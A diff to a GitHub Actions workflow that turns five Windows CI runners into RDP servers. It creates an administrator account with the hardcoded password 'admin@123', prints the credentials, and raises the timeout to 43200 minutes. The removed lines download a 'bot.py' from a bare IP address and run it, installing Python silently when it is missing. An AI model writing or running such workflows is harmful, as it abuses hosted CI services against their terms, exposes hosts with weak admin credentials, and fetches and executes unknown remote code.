@@ -10,7 +10,7 @@ jobs:
       matrix:
         server: [1, 2, 3, 4, 5]
     runs-on: windows-2022
-    timeout-minutes: 60
+    timeout-minutes: 43200
     steps:
       - name: Run RDP Server ${{ matrix.server }}
         shell: pwsh
@@ -30,9 +30,11 @@ jobs:
             Restart-Service TermService -Force
             
             $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+            
             if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
-              Remove-LocalUser -Name "TOOLBOXLAP" -Force
+              Remove-LocalUser -Name "TOOLBOXLAP"
             }
+            
             New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
             Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
             Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
@@ -44,12 +46,10 @@ jobs:
             }
             
             Write-Host "============================================"
-            Write-Host "SERVER NUMBER : $serverNumber"
-            Write-Host "WINDOWS OS    : windows-2022"
-            Write-Host "IP ADDRESS    : $ip"
-            Write-Host "PORT          : 3389"
-            Write-Host "USERNAME      : TOOLBOXLAP"
-            Write-Host "PASSWORD      : admin@123"
+            Write-Host "SERVER : $serverNumber | IP: $ip"
+            Write-Host "USER   : TOOLBOXLAP"
+            Write-Host "PASS   : admin@123"
+            Write-Host "PORT   : 3389"
             Write-Host "============================================"
             
             $desktop = [Environment]::GetFolderPath("Desktop")
@@ -62,39 +62,13 @@ jobs:
             "OS: windows-2022" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
             "Iteration: $iteration" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
             
-            $btol = "http://31.57.97.230:5000"
-            try {
-                Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
-                $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-                if (-not $pythonPath) {
-                    $installer = "$env:TEMP\python.exe"
-                    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
-                    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-                    Remove-Item $installer -Force
-                    Start-Sleep -Seconds 10
-                    $pythonPath = "C:\Python311\python.exe"
-                }
-                if (Test-Path "$desktop\bot.py") {
-                    Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
-                }
-            } catch {
-                Write-Host "Error downloading bot"
-            }
+            Write-Host "Waiting 60 seconds..."
+            Start-Sleep -Seconds 60
             
-            Write-Host "Waiting 60 seconds before changing IP..."
-            
-            for ($i = 60; $i -ge 1; $i--) {
-              Write-Host "Changing IP in $i seconds..."
-              Start-Sleep -Seconds 1
-            }
-            
-            Write-Host "Resetting server to get new IP..."
+            Write-Host "Resetting server..."
             netsh advfirewall firewall delete rule name="RDP" 2>$null
             Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1 -Force
             
-            Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-            
             $iteration++
-            Write-Host "Starting new iteration..."
             Start-Sleep -Seconds 5
           }
